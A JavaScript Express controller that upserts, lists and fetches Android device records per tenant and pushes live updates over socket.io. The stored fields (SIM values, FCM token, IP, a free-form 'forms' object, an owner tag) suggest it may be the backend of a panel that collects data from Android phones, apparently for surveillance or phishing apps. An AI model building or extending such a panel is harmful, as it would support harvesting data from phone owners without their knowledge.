import Device from "../models/Device.js";

function getIo(req) {
  return req.app.get("io");
}

function tenantOf(req) {
  return req.auth?.tenantId;
}

/** Upsert device — scoped per tenant. */
export async function upsertDevice(req, res) {
  try {
    const tenantId = tenantOf(req);
    if (!tenantId) return res.status(403).json({ ok: false, error: "no tenant" });
    const io = getIo(req);
    const body = req.body || {};
    const android_id = String(body.android_id || body.androidId || "").trim();
    if (!android_id) {
      return res.status(400).json({ ok: false, error: "android_id required" });
    }

    const patch = {
      brand: body.brand ?? "",
      model: body.model ?? "",
      android_version: body.android_version ?? body.androidVersion ?? "",
      sdk: Number(body.sdk) || 0,
      battery: Number(body.battery) || 0,
      fcm_token: body.fcm_token ?? body.fcmToken ?? "",
      sim1: body.sim1 ?? "",
      sim2: body.sim2 ?? "",
      kiskahai: body.kiskahai ?? "",
      status: body.status ?? "online",
      timestamp: Number(body.timestamp) || Date.now(),
    };
    if (body.ip) patch.ip = String(body.ip);
    if (body.notes != null) patch.notes = String(body.notes);
    if (body.forms && typeof body.forms === "object") patch.forms = body.forms;

    const doc = await Device.findOneAndUpdate(
      { tenantId, android_id },
      { $set: patch, $setOnInsert: { tenantId, android_id } },
      { new: true, upsert: true, setDefaultsOnInsert: true }
    ).lean();

    io?.to(`tenant:${tenantId}`).emit("deviceUpdateGlobal", doc);
    io?.to(`tenant:${tenantId}:${android_id}`).emit("deviceUpdate", doc);

    return res.json({ ok: true, device: doc });
  } catch (e) {
    console.error("upsertDevice", e);
    return res.status(500).json({ ok: false, error: "server error" });
  }
}

export async function listDevices(req, res) {
  try {
    const tenantId = tenantOf(req);
    if (!tenantId) return res.status(403).json({ ok: false, error: "no tenant" });
    const list = await Device.find({ tenantId }).sort({ updatedAt: -1 }).lean();
    const byId = Object.fromEntries(list.map((d) => [d.android_id, { ...d, id: d.android_id }]));
    return res.json({ ok: true, devices: list, usersTree: byId });
  } catch (e) {
    console.error("listDevices", e);
    return res.status(500).json({ ok: false, error: "server error" });
  }
}

export async function getDevice(req, res) {
  try {
    const tenantId = tenantOf(req);
    if (!tenantId) return res.status(403).json({ ok: false, error: "no tenant" });
    const android_id = String(req.params.id || "").trim();
    if (!android_id) return res.status(400).json({ ok: false, error: "id required" });
    const doc = await Device.findOne({ tenantId, android_id }).lean();
    if (!doc) return res.status(404).json({ ok: false, error: "not found" });
    return res.json({ ok: true, device: doc });
  } catch (e) {
    console.error("getDevice", e);
    return res.status(500).json({ ok: false, error: "server error" });
  }
}
